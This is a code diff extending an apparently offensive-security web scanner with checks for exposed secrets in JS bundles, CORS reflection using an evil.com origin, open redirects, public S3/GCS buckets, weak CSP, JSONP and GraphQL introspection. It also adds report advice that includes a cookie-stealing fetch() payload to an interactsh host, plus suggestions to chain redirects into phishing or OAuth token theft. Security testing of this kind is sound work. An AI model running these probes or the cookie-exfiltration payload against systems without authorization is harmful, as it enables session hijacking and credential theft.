@@ -574,8 +574,422 @@ def check_firebase(js_findings):
     return firebase_findings
 
 
+# ── Stage 8: Secrets Detection ────────────────────────────────────────────────
+def detect_secrets():
+    log("info", "Scanning JS bundles for exposed secrets...")
+    secret_findings = []
+
+    SECRET_PATTERNS = [
+        ("aws_access_key",     r'(?<![A-Z0-9])(AKIA[0-9A-Z]{16})(?![A-Z0-9])',                          "CRITICAL"),
+        ("aws_secret_key",     r'(?i)aws.{0,20}secret.{0,20}["\']([A-Za-z0-9/+]{40})["\']',             "CRITICAL"),
+        ("github_token",       r'ghp_[A-Za-z0-9]{36}',                                                   "CRITICAL"),
+        ("github_oauth",       r'gho_[A-Za-z0-9]{36}',                                                   "CRITICAL"),
+        ("stripe_live_key",    r'sk_live_[A-Za-z0-9]{24,}',                                              "CRITICAL"),
+        ("stripe_test_key",    r'sk_test_[A-Za-z0-9]{24,}',                                              "HIGH"),
+        ("twilio_sid",         r'AC[a-f0-9]{32}',                                                        "HIGH"),
+        ("slack_token",        r'xox[bpars]-[A-Za-z0-9\-]{10,}',                                         "HIGH"),
+        ("sendgrid_key",       r'SG\.[A-Za-z0-9_\-]{22}\.[A-Za-z0-9_\-]{43}',                           "HIGH"),
+        ("jwt_token",          r'eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}',    "MEDIUM"),
+        ("private_key_header", r'-----BEGIN (?:RSA |EC |)PRIVATE KEY-----',                              "CRITICAL"),
+        ("mailgun_key",        r'key-[a-zA-Z0-9]{32}',                                                   "HIGH"),
+        ("generic_api_key",    r'(?i)(?:api_key|apikey|api-key)\s*[=:]\s*["\']([A-Za-z0-9_\-]{20,})["\']', "MEDIUM"),
+    ]
+
+    bundle_dir = Path("/tmp/xss_bundles")
+    if not bundle_dir.exists():
+        log("warn", "No JS bundles cached — skipping secrets detection")
+        return secret_findings
+
+    seen = set()
+    for bundle_file in bundle_dir.glob("*.js"):
+        try:
+            content = bundle_file.read_text(encoding="utf-8", errors="ignore")
+            for name, pattern, severity in SECRET_PATTERNS:
+                for match in re.finditer(pattern, content):
+                    secret = match.group(0)[:60]
+                    dedup_key = (name, secret[:20])
+                    if dedup_key in seen:
+                        continue
+                    seen.add(dedup_key)
+                    idx = match.start()
+                    ctx = content[max(0, idx-30):idx+len(secret)+30].replace("\n", " ").strip()
+                    log("crit" if severity == "CRITICAL" else "warn",
+                        f"Secret [{severity}] {name}: {secret[:40]}...")
+                    secret_findings.append({
+                        "type":     "secret_" + name,
+                        "severity": severity,
+                        "detail":   f"{name} found in {bundle_file.name}",
+                        "secret":   secret,
+                        "context":  ctx[:150],
+                    })
+        except Exception:
+            continue
+
+    log("good", f"Secrets scan complete — {len(secret_findings)} potential secrets found")
+    return secret_findings
+
+
+# ── Stage 9: CORS Misconfiguration ───────────────────────────────────────────
+def check_cors(target):
+    log("info", "Testing CORS misconfiguration...")
+    cors_findings = []
+    evil_origin = "https://evil.com"
+
+    parsed = urllib.parse.urlparse(target)
+    base   = target.rstrip("/")
+    root   = f"{parsed.scheme}://{parsed.netloc}"
+    test_urls = list(dict.fromkeys([
+        target, root,
+        base + "/api", base + "/api/v1", base + "/api/v2",
+        root + "/api", root + "/graphql",
+    ]))
+
+    with httpx.Client(timeout=10, verify=False, follow_redirects=True) as client:
+        for url in test_urls:
+            try:
+                r = client.get(url, headers={"Origin": evil_origin, "User-Agent": "Mozilla/5.0"})
+                acao = r.headers.get("access-control-allow-origin", "")
+                acac = r.headers.get("access-control-allow-credentials", "").lower()
+
+                if acao == evil_origin and acac == "true":
+                    log("crit", f"CORS CRITICAL — origin reflected + credentials=true at {url}")
+                    cors_findings.append({
+                        "type":     "cors_credentials_reflected",
+                        "severity": "CRITICAL",
+                        "url":      url,
+                        "detail":   "ACAO reflects attacker origin AND credentials=true — full session hijack possible",
+                    })
+                elif acao == "*" and acac == "true":
+                    log("crit", f"CORS CRITICAL — wildcard + credentials=true at {url}")
+                    cors_findings.append({
+                        "type":     "cors_wildcard_credentials",
+                        "severity": "CRITICAL",
+                        "url":      url,
+                        "detail":   "Wildcard CORS with credentials=true — invalid config, exploitable",
+                    })
+                elif acao == evil_origin:
+                    log("warn", f"CORS MEDIUM — origin reflected (no credentials) at {url}")
+                    cors_findings.append({
+                        "type":     "cors_origin_reflected",
+                        "severity": "MEDIUM",
+                        "url":      url,
+                        "detail":   "ACAO reflects attacker origin without credentials — low-impact for credentialed endpoints",
+                    })
+            except Exception:
+                continue
+
+    crits = [f for f in cors_findings if f["severity"] == "CRITICAL"]
+    log("good", f"CORS check complete — {len(crits)} CRITICAL, {len(cors_findings)} total")
+    return cors_findings
+
+
+# ── Stage 10: Open Redirect Detection ────────────────────────────────────────
+def check_open_redirect(urls):
+    log("info", "Testing for open redirects...")
+    redirect_findings = []
+    evil_url = "https://evil.com"
+
+    REDIRECT_PARAMS = {
+        "redirect", "redirect_uri", "redirect_url", "return", "returnto",
+        "return_url", "return_to", "next", "next_url", "url", "goto",
+        "destination", "dest", "target", "redir", "link", "continue",
+        "forward", "callback", "back", "ref", "referer", "referrer",
+        "u", "r", "location", "out", "jump", "to", "from",
+    }
+
+    tested = set()
+    with httpx.Client(timeout=8, verify=False, follow_redirects=False,
+                      headers={"User-Agent": "Mozilla/5.0"}) as client:
+        for url in urls:
+            parsed = urllib.parse.urlparse(url)
+            params = urllib.parse.parse_qs(parsed.query)
+            for param in params:
+                if param.lower() not in REDIRECT_PARAMS:
+                    continue
+                test_params = {k: (evil_url if k == param else v[0]) for k, v in params.items()}
+                test_url = parsed._replace(query=urllib.parse.urlencode(test_params)).geturl()
+                if test_url in tested:
+                    continue
+                tested.add(test_url)
+                try:
+                    r = client.get(test_url)
+                    location = r.headers.get("location", "")
+                    if r.status_code in (301, 302, 303, 307, 308) and "evil.com" in location:
+                        log("crit", f"Open redirect — param '{param}' redirects to evil.com at {url}")
+                        redirect_findings.append({
+                            "type":     "open_redirect",
+                            "severity": "HIGH",
+                            "url":      url,
+                            "param":    param,
+                            "test_url": test_url,
+                            "detail":   f"Param '{param}' causes redirect to {location}",
+                        })
+                except Exception:
+                    continue
+
+    log("good", f"Redirect check complete — {len(redirect_findings)} open redirects found")
+    return redirect_findings
+
+
+# ── Stage 11: Cloud Storage Misconfiguration ──────────────────────────────────
+def check_cloud_storage():
+    log("info", "Checking for exposed cloud storage buckets...")
+    storage_findings = []
+
+    bundle_dir = Path("/tmp/xss_bundles")
+    if not bundle_dir.exists():
+        return storage_findings
+
+    s3_buckets  = set()
+    gcs_buckets = set()
+
+    S3_PATTERNS = [
+        r'https?://([a-z0-9][a-z0-9\-]{2,62})\.s3(?:[\.\-][a-z0-9\-]+)?\.amazonaws\.com',
+        r's3://([a-z0-9][a-z0-9\-]{2,62})',
+        r'https?://s3(?:[\.\-][a-z0-9\-]+)?\.amazonaws\.com/([a-z0-9][a-z0-9\-]{2,62})',
+    ]
+    GCS_PATTERNS = [
+        r'https?://storage\.googleapis\.com/([a-z0-9][a-z0-9\-_.]{1,61}[a-z0-9])/',
+        r'gs://([a-z0-9][a-z0-9\-_.]{1,61}[a-z0-9])',
+        r'https?://([a-z0-9][a-z0-9\-_.]{1,61}[a-z0-9])\.storage\.googleapis\.com',
+    ]
+
+    for bundle_file in bundle_dir.glob("*.js"):
+        try:
+            content = bundle_file.read_text(encoding="utf-8", errors="ignore")
+            for pat in S3_PATTERNS:
+                for m in re.finditer(pat, content, re.IGNORECASE):
+                    s3_buckets.add(m.group(1).lower())
+            for pat in GCS_PATTERNS:
+                for m in re.finditer(pat, content, re.IGNORECASE):
+                    gcs_buckets.add(m.group(1).lower())
+        except Exception:
+            continue
+
+    log("info", f"Found {len(s3_buckets)} S3, {len(gcs_buckets)} GCS buckets in bundles")
+
+    with httpx.Client(timeout=10, verify=False, follow_redirects=True) as client:
+
+        for bucket in list(s3_buckets)[:10]:
+            try:
+                s3_url = f"https://{bucket}.s3.amazonaws.com/?list-type=2"
+                r = client.get(s3_url)
+                if r.status_code == 200 and "<ListBucketResult" in r.text:
+                    count = r.text.count("<Key>")
+                    log("crit", f"S3 OPEN LISTING — {bucket}: {count} objects")
+                    storage_findings.append({
+                        "type":     "s3_open_listing",
+                        "severity": "HIGH",
+                        "bucket":   bucket,
+                        "url":      s3_url,
+                        "detail":   f"S3 bucket '{bucket}' allows unauthenticated listing — {count} objects",
+                        "evidence": r.text[:300],
+                    })
+                elif r.status_code == 403:
+                    log("good", f"S3 '{bucket}': LOCKED (403)")
+            except Exception:
+                continue
+
+        for bucket in list(gcs_buckets)[:10]:
+            try:
+                gcs_url = f"https://storage.googleapis.com/storage/v1/b/{bucket}/o"
+                r = client.get(gcs_url)
+                if r.status_code == 200:
+                    items = r.json().get("items", [])
+                    if items:
+                        log("crit", f"GCS OPEN LISTING — {bucket}: {len(items)} objects")
+                        storage_findings.append({
+                            "type":     "gcs_open_listing",
+                            "severity": "HIGH",
+                            "bucket":   bucket,
+                            "url":      gcs_url,
+                            "detail":   f"GCS bucket '{bucket}' allows unauthenticated listing — {len(items)} objects",
+                            "evidence": str([i.get("name") for i in items[:5]]),
+                        })
+                    else:
+                        log("info", f"GCS '{bucket}': accessible but empty")
+                elif r.status_code == 403:
+                    log("good", f"GCS '{bucket}': LOCKED (403)")
+            except Exception:
+                continue
+
+    log("good", f"Cloud storage check complete — {len(storage_findings)} findings")
+    return storage_findings
+
+
+# ── Stage 12: CSP Analyser ────────────────────────────────────────────────────
+def analyze_csp(target):
+    log("info", "Analysing Content-Security-Policy...")
+    csp_findings = []
+
+    WEAK_KEYWORDS = {
+        "'unsafe-inline'": ("CSP allows unsafe-inline scripts — bypasses script nonces/hashes", "HIGH"),
+        "'unsafe-eval'":   ("CSP allows unsafe-eval — eval() and new Function() are unblocked",  "HIGH"),
+        "data:":           ("CSP allows data: URIs in script context — trivial bypass",            "HIGH"),
+        "'unsafe-hashes'": ("CSP unsafe-hashes can permit inline event handler execution",         "MEDIUM"),
+    }
+    WILDCARD_PATTERNS = [
+        (r"script-src\s[^;]*\s\*",  "Wildcard (*) in script-src — any origin can load scripts", "CRITICAL"),
+        (r"default-src\s[^;]*\s\*", "Wildcard (*) in default-src",                              "CRITICAL"),
+        (r"script-src\s[^;]*http:/", "HTTP origin in script-src — MITM can inject scripts",     "HIGH"),
+    ]
+
+    with httpx.Client(timeout=10, verify=False, follow_redirects=True) as client:
+        try:
+            r = client.get(target, headers={"User-Agent": "Mozilla/5.0"})
+        except Exception as e:
+            log("bad", f"CSP fetch failed: {e}")
+            return csp_findings
+
+        csp = r.headers.get("content-security-policy", "")
+        if not csp:
+            log("warn", "No Content-Security-Policy header — browser-side XSS mitigation absent")
+            csp_findings.append({
+                "type":     "csp_missing",
+                "severity": "MEDIUM",
+                "detail":   "No CSP header — browser executes all inline scripts without restriction",
+                "csp":      "",
+            })
+            return csp_findings
+
+        log("info", f"CSP found ({len(csp)} chars)")
+
+        for keyword, (detail, severity) in WEAK_KEYWORDS.items():
+            if keyword in csp:
+                log("warn", f"CSP [{severity}] {detail}")
+                csp_findings.append({
+                    "type":     "csp_weak_directive",
+                    "severity": severity,
+                    "keyword":  keyword,
+                    "detail":   detail,
+                    "csp":      csp[:300],
+                })
+
+        for pattern, detail, severity in WILDCARD_PATTERNS:
+            if re.search(pattern, csp, re.IGNORECASE):
+                log("warn", f"CSP [{severity}] {detail}")
+                csp_findings.append({
+                    "type":     "csp_wildcard",
+                    "severity": severity,
+                    "detail":   detail,
+                    "csp":      csp[:300],
+                })
+
+    if csp_findings:
+        log("good", f"CSP analysis complete — {len(csp_findings)} weaknesses")
+    else:
+        log("good", "CSP looks well-configured — no obvious bypasses detected")
+    return csp_findings
+
+
+# ── Stage 13: JSONP Endpoint Detection ───────────────────────────────────────
+def check_jsonp(urls):
+    log("info", "Detecting JSONP endpoints...")
+    jsonp_findings = []
+
+    CALLBACK_PARAMS = {"callback", "jsonp", "cb", "jsoncallback", "json_callback", "call"}
+    probe = CANARY + "_jsonp"
+
+    tested = set()
+    with httpx.Client(timeout=8, verify=False, follow_redirects=True,
+                      headers={"User-Agent": "Mozilla/5.0"}) as client:
+        for url in urls:
+            parsed = urllib.parse.urlparse(url)
+            params = urllib.parse.parse_qs(parsed.query)
+            for param in params:
+                if param.lower() not in CALLBACK_PARAMS:
+                    continue
+                test_params = {k: (probe if k == param else v[0]) for k, v in params.items()}
+                test_url = parsed._replace(query=urllib.parse.urlencode(test_params)).geturl()
+                if test_url in tested:
+                    continue
+                tested.add(test_url)
+                try:
+                    r = client.get(test_url)
+                    if probe + "(" in r.text:
+                        log("crit", f"JSONP endpoint — '{param}' reflects unquoted at {url}")
+                        jsonp_findings.append({
+                            "type":     "jsonp_endpoint",
+                            "severity": "HIGH",
+                            "url":      url,
+                            "param":    param,
+                            "test_url": test_url,
+                            "detail":   f"Callback param '{param}' reflected as bare function call — JSONP XSS possible",
+                            "evidence": r.text[:200],
+                        })
+                except Exception:
+                    continue
+
+    log("good", f"JSONP check complete — {len(jsonp_findings)} endpoints found")
+    return jsonp_findings
+
+
+# ── Stage 14: GraphQL Introspection ──────────────────────────────────────────
+def check_graphql(target):
+    log("info", "Checking GraphQL introspection...")
+    gql_findings = []
+
+    parsed = urllib.parse.urlparse(target)
+    base   = target.rstrip("/")
+    root   = f"{parsed.scheme}://{parsed.netloc}"
+
+    endpoints = list(dict.fromkeys([
+        base + "/graphql", base + "/api/graphql", base + "/gql", base + "/query",
+        root + "/graphql", root + "/api/graphql",
+    ]))
+
+    introspection = {"query": "{ __schema { queryType { name } types { name kind } } }"}
+
+    with httpx.Client(timeout=10, verify=False, follow_redirects=True,
+                      headers={"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}) as client:
+        for endpoint in endpoints:
+            try:
+                r = client.post(endpoint, json=introspection)
+                if r.status_code == 200:
+                    try:
+                        data = r.json()
+                        schema = data.get("data", {})
+                        if schema and "__schema" in str(schema):
+                            types = data["data"]["__schema"].get("types", [])
+                            log("crit", f"GraphQL introspection OPEN at {endpoint} — {len(types)} types")
+                            gql_findings.append({
+                                "type":     "graphql_introspection_enabled",
+                                "severity": "MEDIUM",
+                                "url":      endpoint,
+                                "detail":   f"Schema fully exposed via introspection — {len(types)} types visible",
+                                "evidence": str(data)[:300],
+                            })
+                            break
+                        elif "errors" in data:
+                            if "introspection" in str(data["errors"]).lower():
+                                log("good", f"GraphQL at {endpoint} — introspection disabled")
+                    except Exception:
+                        pass
+                elif r.status_code == 405:
+                    r2 = client.get(endpoint, params={"query": "{ __schema { queryType { name } } }"})
+                    if r2.status_code == 200 and "__schema" in r2.text:
+                        log("crit", f"GraphQL introspection via GET at {endpoint}")
+                        gql_findings.append({
+                            "type":     "graphql_introspection_enabled",
+                            "severity": "MEDIUM",
+                            "url":      endpoint,
+                            "detail":   "Schema exposed via GET introspection query",
+                            "evidence": r2.text[:300],
+                        })
+                        break
+            except Exception:
+                continue
+
+    if not gql_findings:
+        log("info", "No accessible GraphQL endpoint or introspection disabled")
+    log("good", f"GraphQL check complete — {len(gql_findings)} findings")
+    return gql_findings
+
+
 # ── Stage 6: Report Generation ────────────────────────────────────────────────
-def generate_report(target, waf, reflected, js_findings, xss_findings, firebase_findings, output_file):
+def generate_report(target, waf, reflected, js_findings, xss_findings, firebase_findings,
+                    secret_findings, cors_findings, redirect_findings, storage_findings,
+                    csp_findings, jsonp_findings, graphql_findings, output_file):
     ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     total = len(xss_findings) + len([f for f in js_findings if f["severity"] == "HIGH"])
 
@@ -688,9 +1102,95 @@ def generate_report(target, waf, reflected, js_findings, xss_findings, firebase_
     else:
         lines.append("No Firebase configuration detected in JS bundles.")
 
+    # Section 5 — Secrets
+    lines += ["", "---", "", "## 5. Secrets in JS Bundles", ""]
+    if secret_findings:
+        lines.append("| Severity | Type | File | Preview |")
+        lines.append("|---|---|---|---|")
+        for s in secret_findings:
+            fname = s["detail"].split(" in ")[-1] if " in " in s["detail"] else "?"
+            preview = s["secret"][:30].replace("|", "\\|") + "..."
+            lines.append(f"| {s['severity']} | `{s['type']}` | `{fname}` | `{preview}` |")
+        lines.append("")
+    else:
+        lines.append("No secrets detected in JS bundles.")
+
+    # Section 6 — CORS
+    lines += ["", "---", "", "## 6. CORS Misconfiguration", ""]
+    if cors_findings:
+        lines.append("| Severity | Type | URL | Detail |")
+        lines.append("|---|---|---|---|")
+        for c in cors_findings:
+            lines.append(f"| {c['severity']} | `{c['type']}` | `{c['url'][:60]}` | {c['detail']} |")
+        lines.append("")
+    else:
+        lines.append("No CORS misconfiguration detected.")
+
+    # Section 7 — Open Redirect
+    lines += ["", "---", "", "## 7. Open Redirect", ""]
+    if redirect_findings:
+        lines.append("| URL | Param | Detail |")
+        lines.append("|---|---|---|")
+        for r in redirect_findings:
+            lines.append(f"| `{r['url'][:60]}` | `{r['param']}` | {r['detail']} |")
+        lines.append("")
+    else:
+        lines.append("No open redirects detected.")
+
+    # Section 8 — Cloud Storage
+    lines += ["", "---", "", "## 8. Cloud Storage Misconfiguration", ""]
+    if storage_findings:
+        lines.append("| Severity | Type | Bucket | Detail |")
+        lines.append("|---|---|---|---|")
+        for s in storage_findings:
+            lines.append(f"| {s['severity']} | `{s['type']}` | `{s.get('bucket','?')}` | {s['detail']} |")
+        lines.append("")
+    else:
+        lines.append("No exposed S3 or GCS buckets detected.")
+
+    # Section 9 — CSP
+    lines += ["", "---", "", "## 9. Content Security Policy", ""]
+    if csp_findings:
+        missing = [f for f in csp_findings if f["type"] == "csp_missing"]
+        issues  = [f for f in csp_findings if f["type"] != "csp_missing"]
+        if missing:
+            lines.append("**Status:** No CSP header present.\n")
+        if issues:
+            lines.append(f"**Header (truncated):** `{issues[0]['csp'][:120]}`\n")
+            lines.append("| Severity | Issue |")
+            lines.append("|---|---|")
+            for c in issues:
+                lines.append(f"| {c['severity']} | {c['detail']} |")
+        lines.append("")
+    else:
+        lines.append("CSP header present and no obvious bypass directives detected.")
+
+    # Section 10 — JSONP
+    lines += ["", "---", "", "## 10. JSONP Endpoints", ""]
+    if jsonp_findings:
+        lines.append("| URL | Param | Evidence |")
+        lines.append("|---|---|---|")
+        for j in jsonp_findings:
+            ev = j.get("evidence", "")[:60].replace("|", "\\|")
+            lines.append(f"| `{j['url'][:60]}` | `{j['param']}` | `{ev}` |")
+        lines.append("")
+    else:
+        lines.append("No JSONP endpoints detected.")
+
+    # Section 11 — GraphQL
+    lines += ["", "---", "", "## 11. GraphQL Introspection", ""]
+    if graphql_findings:
+        lines.append("| URL | Detail |")
+        lines.append("|---|---|")
+        for g in graphql_findings:
+            lines.append(f"| `{g['url']}` | {g['detail']} |")
+        lines.append("")
+    else:
+        lines.append("No GraphQL introspection endpoint found or introspection disabled.")
+
     lines += [
         "", "---", "",
-        "## 5. Next Steps",
+        "## 12. Next Steps",
         "",
         "1. **Manually trace** each HIGH-severity sink to its data source",
         "2. **Test DOM sinks** with context-specific payloads from the XSS methodology PDF",
@@ -698,6 +1198,9 @@ def generate_report(target, waf, reflected, js_findings, xss_findings, firebase_
         "4. **Review source maps** if exposed — reconstruct original source for deeper analysis",
         "5. **Test OOB callbacks** by replacing `alert(1)` with `fetch('https://your.interactsh.com/?c='+document.cookie)`",
         "6. **Firebase** — if misconfigs found, document the write/read with a screenshot for the report",
+        "7. **Secrets** — rotate any exposed keys immediately; verify scope with the provider",
+        "8. **CORS** — if credentials=true + origin reflected, craft a PoC that exfiltrates the session cookie",
+        "9. **Open redirects** — chain with phishing or OAuth token theft for higher impact",
         "",
         "---",
         "",
@@ -767,26 +1270,64 @@ def main():
     if not args.skip_js:
         firebase_findings = check_firebase(js_findings)
 
+    # Stage 8 — Secrets in JS bundles
+    secret_findings = []
+    if not args.skip_js:
+        secret_findings = detect_secrets()
+
+    # Stage 9 — CORS misconfiguration
+    cors_findings = check_cors(target)
+
+    # Stage 10 — Open redirect
+    redirect_findings = check_open_redirect(urls)
+
+    # Stage 11 — Cloud storage (S3 / GCS)
+    storage_findings = []
+    if not args.skip_js:
+        storage_findings = check_cloud_storage()
+
+    # Stage 12 — CSP analysis
+    csp_findings = analyze_csp(target)
+
+    # Stage 13 — JSONP endpoints
+    jsonp_findings = check_jsonp(urls)
+
+    # Stage 14 — GraphQL introspection
+    graphql_findings = check_graphql(target)
+
     # Stage 6 — Report
     elapsed = round(time.time() - start, 1)
     log("good", f"Scan complete in {elapsed}s")
     print()
-    confirmed   = [f for f in xss_findings if f["type"] == "xss_confirmed"]
-    unverified  = [f for f in xss_findings if f["type"] == "xss_poc_unverified"]
-    fb_crits    = [f for f in firebase_findings if f["severity"] == "CRITICAL"]
-    fb_highs    = [f for f in firebase_findings if f["severity"] == "HIGH"]
+    confirmed      = [f for f in xss_findings if f["type"] == "xss_confirmed"]
+    unverified     = [f for f in xss_findings if f["type"] == "xss_poc_unverified"]
+    fb_crits       = [f for f in firebase_findings if f["severity"] == "CRITICAL"]
+    fb_highs       = [f for f in firebase_findings if f["severity"] == "HIGH"]
+    sec_crits      = [f for f in secret_findings if f["severity"] == "CRITICAL"]
+    cors_crits     = [f for f in cors_findings if f["severity"] == "CRITICAL"]
     print(f"{BO}{'='*60}{RE}")
-    print(f"  {R}XSS Confirmed:  {len(confirmed)} (browser-verified){RE}")
-    print(f"  {Y}XSS PoC:        {len(unverified)} (needs manual verify){RE}")
-    print(f"  {Y}Reflection pts: {len(reflected)}{RE}")
-    print(f"  {Y}DOM Sinks:      {len([f for f in js_findings if f['type']=='dom_sink'])}{RE}")
-    print(f"  {R}Firebase Crit:  {len(fb_crits)}{RE}")
-    print(f"  {Y}Firebase High:  {len(fb_highs)}{RE}")
-    print(f"  {B}WAF:            {waf.upper()}{RE}")
+    print(f"  {R}XSS Confirmed:   {len(confirmed)} (browser-verified){RE}")
+    print(f"  {Y}XSS PoC:         {len(unverified)} (needs manual verify){RE}")
+    print(f"  {Y}Reflection pts:  {len(reflected)}{RE}")
+    print(f"  {Y}DOM Sinks:       {len([f for f in js_findings if f['type']=='dom_sink'])}{RE}")
+    print(f"  {R}Secrets:         {len(secret_findings)} ({len(sec_crits)} CRITICAL){RE}")
+    print(f"  {R}CORS:            {len(cors_findings)} ({len(cors_crits)} CRITICAL){RE}")
+    print(f"  {R}Open Redirects:  {len(redirect_findings)}{RE}")
+    print(f"  {Y}Cloud Storage:   {len(storage_findings)}{RE}")
+    print(f"  {Y}CSP Issues:      {len(csp_findings)}{RE}")
+    print(f"  {Y}JSONP Endpoints: {len(jsonp_findings)}{RE}")
+    print(f"  {Y}GraphQL:         {len(graphql_findings)}{RE}")
+    print(f"  {R}Firebase Crit:   {len(fb_crits)}{RE}")
+    print(f"  {Y}Firebase High:   {len(fb_highs)}{RE}")
+    print(f"  {B}WAF:             {waf.upper()}{RE}")
     print(f"{BO}{'='*60}{RE}")
     print()
 
-    generate_report(target, waf, reflected, js_findings, xss_findings, firebase_findings, report_file)
+    generate_report(
+        target, waf, reflected, js_findings, xss_findings, firebase_findings,
+        secret_findings, cors_findings, redirect_findings, storage_findings,
+        csp_findings, jsonp_findings, graphql_findings, report_file
+    )
 
 
 if __name__ == "__main__":
